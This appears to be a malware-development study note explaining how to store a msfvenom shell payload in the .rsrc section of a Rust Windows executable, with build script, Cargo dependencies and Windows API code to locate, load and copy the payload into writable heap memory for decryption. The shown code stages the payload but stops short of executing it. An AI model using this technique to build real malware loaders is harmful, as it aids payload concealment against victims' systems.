# Intro
Stored payload in `.rsrc` section is a cleaner method for malware authors, since larger payloads cannot be stored in the `.data` or `r.data` sections due to size limits. 

## .rsrc Section
The steps below illustrate how to store a payload in the .rsrc section in rust.

First all we need to store a payload (in this case a msfvenom shell) into a `calc.ico` file, now create a `resource.rc` file where the type is [RCDATA](https://learn.microsoft.com/en-us/windows/win32/menurc/rcdata-resource) and the IDR_RCDATA1 is a payload's ID in the resource section.This is important in order to be able to retrieve the payload from the resource section later.

```rust
#define IDR_RCDATA1 101

IDR_RCDATA1 RCDATA "calc.ico"
```

![[Pasted image 20250530223551.png]]

Now we need to compile the `resource.rc` file to do that in rust we can create a `build.rs` file and write this code in 

```rust
fn main(){
    // This build script compiles a Windows resource file.
    windres::Build::new()
        .compile("resource.rc")
        .unwrap();
}
```

add the **windres** as `[build-dependencies]` in the `Cargo.toml` file

```rust
[build-dependencies]
windres = "0.2.2"
```

in the dependecies section add the `winapi` 
```rust
[dependencies]
winapi = { version = "0.3.9", features = ["winbase", "libloaderapi", "minwindef", "errhandlingapi", "winuser", "heapapi"] }
```

using `FindResourceW` Windows API function through the `IDR_RCDATA1` (the payload's ID) we can retrieve the location of the payload 

```rust
let h_module = ptr::null_mut();
let h_rsrc = FindResourceW(
	h_module,
	MAKEINTRESOURCEW(101),
	RT_RCDATA
);
if h_rsrc.is_null(){
	print!("[!] Failed to find resource: {}\n", GetLastError());
	return;
}
```

Use `LoadResource` Windows API function to retrieve the `HGLOBAL` handler that is required to call `LockResource` later
```rust
let h_global = LoadResource(h_module,h_rsrc);
if h_global.is_null() {
	print!("[!] Failed to load resource: {}\n", GetLastError());
	return;
}
```

Use `LockResource` to  retrieve the pointer of the data. This is necessary to access the actual data stored in the resource.

```rust
let p_payload = LockResource(h_global) as *mut u8;
if p_payload.is_null() {
	print!("[!] Failed to lock resource: {}\n", GetLastError());
	return;
}
```

## Make the payload editable
Now the .rsrc section is `read-only` so if our payload is encrypted and we need to decrypt we can do it by create a virtual memory location and copy the `p_payload` over it.

First all retrieve the the size of the payload using `SizeofResource`  

```rust
let payload_size = SizeofResource(h_module, h_rsrc) as usize;
if payload_size == 0 {
	print!("[!] Failed to get resource size: {}\n", GetLastError());
	return;
}
```

Now allocate the valid memory location using `HeapAlloc`
```rust
let h_heap = GetProcessHeap();
let p_tmp_buffer = HeapAlloc(h_heap,0,payload_size) as *mut u8;
if p_tmp_buffer.is_null() {
	print!("[!] Failed to allocate memory on heap: {}\n", GetLastError());
return;
}
```

In the end copy the payload in the new memory location using `copy_nonoverlapping` function.
```rust
std::ptr::copy_nonoverlapping(p_payload, p_tmp_buffer, payload_size);
```


## Code execution

We can add this code to print the address space of the payload 
```rust
// Print section for debugging purposes
println!("[i] Payload Addresss: {:p}", p_payload);
println!("[i] Payload Size: {}", payload_size);
println!("[i] Temporary Buffer Address: {:p}", p_tmp_buffer);

println!("[#] Press <Enter> to Exit...");
let _ = std::io::stdin().read(&mut [0u8; 1]);
```

![[Pasted image 20250530225833.png]]

As in image above we can notice the `0x7ff72f05a060` is the address of payload in the `resource.rc` section. 
The `0x19a73c7ee40` is our editable payload's address instance.

## References

- **[MyCode](https://github.com/gabriele-annese/Malware-Development/tree/main/Rust/MalDev-Academy/payload_placement_rsrc_section)**